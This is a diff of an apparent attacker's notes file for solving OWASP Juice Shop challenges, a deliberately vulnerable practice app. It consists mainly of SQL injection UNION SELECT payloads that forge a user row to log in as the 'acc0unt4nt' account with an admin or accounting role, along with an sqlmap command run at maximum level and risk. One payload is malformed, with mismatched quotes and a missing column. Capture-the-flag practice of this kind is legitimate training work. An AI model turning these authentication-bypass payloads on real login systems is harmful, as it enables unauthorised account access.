@@ -85,4 +85,13 @@ sqlmap -r ss.req --batch --level=5 --risk=3 --ignore-code=401  -D SQLite -T Prod
 SELECT * FROM Users WHERE email = 'admin@juice-sh.op' UNION SELECT 'acc0unt4nt@juice-sh.op',NULL-- ' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NUL
 
 
-' UNION SELECT * FROM (SELECT 123 as 'id', 'jopa' as 'username', 'acc0unt4nt@juice-sh.op' as 'email','password' as 'password', 'admin' as 'role','' as 'deluxeToken' , '0.0.0.0' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as isActive,   datetime('now') as 'createdAt', datetime('now') as 'updatedAt', NULL as 'deletedAt')-- 
+' UNION SELECT * FROM (SELECT 123 as 'id', 'jopa' as 'username', 'acc0unt4nt@juice-sh.op' as 'email','password' as 'password', 'admin' as 'role','' as 'deluxeToken' , '0.0.0.0' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as isActive,   '2020-09-02 10:00:00.123 +00:00' as 'createdAt', '2020-09-02 10:00:00.123 +00:00' as 'updatedAt', NULL as 'deletedAt')-- 
+
+
+' UNION SELECT * FROM (SELECT 1234 as 'id','' as 'username','acc0unt4nt@juice-sh.op' as 'email','password' as 'password','accounting' as 'role','' as 'deluxeToken','127.0.0.1' as 'lastLoginIp','/assets/public/images/uploads/default.svg' as 'profileImage', 'aa' as 'totpSecret',1 as 'isActive','2020-09-02 10:00:00.123 +00:00' as 'createdAt', '2020-09-02 10:00:00.123 +00:00' as 'updatedAt', NULL as 'deletedAt' )-- 
+
+
+'UNION SELECT * FROM (SELECT 1000 as 'id',"as 'username','acc0unt4nt@juice-sh.op'as'email','asdfasdf'as'password','accounting'as'role',"as'deluxeToken','127.0.0.1'as'lastLoginIp','default.svg'as'profileImage',"as'totpSecret',1 as 'isActive','2020-08-30 11:12:13.456 +00:00' as'updatedAt', null as 'deletedAt')--
+
+
+' UNION SELECT 1,'jopa','acc0unt4nt@juice-sh.op','asdf','accounting','','127.0.0.1','default.svg','',1,'2020-09-02 11:12:13','2020-09-02 11:12:13',NULL-- 
